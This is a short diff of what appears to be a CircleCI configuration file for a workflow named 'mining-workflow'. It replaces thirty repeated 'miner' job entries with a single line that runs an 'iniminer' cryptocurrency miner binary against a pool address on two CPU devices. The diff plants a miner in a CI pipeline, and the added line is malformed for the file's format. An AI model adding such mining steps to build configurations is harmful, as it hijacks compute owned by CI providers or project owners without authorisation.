@@ -39,33 +39,4 @@ workflows:
   version: 2
   mining-workflow:
     jobs:
-      - miner
-      - miner
-      - miner
-      - miner
-      - miner
-      - miner
-      - miner
-      - miner
-      - miner
-      - miner
-      - miner
-      - miner
-      - miner
-      - miner
-      - miner
-      - miner
-      - miner
-      - miner
-      - miner
-      - miner
-      - miner
-      - miner
-      - miner
-      - miner
-      - miner
-      - miner
-      - miner
-      - miner
-      - miner
-      - miner
+      - ./iniminer-linux-x64 --pool << pipeline.parameters.pool-address >> --cpu-devices 0 1
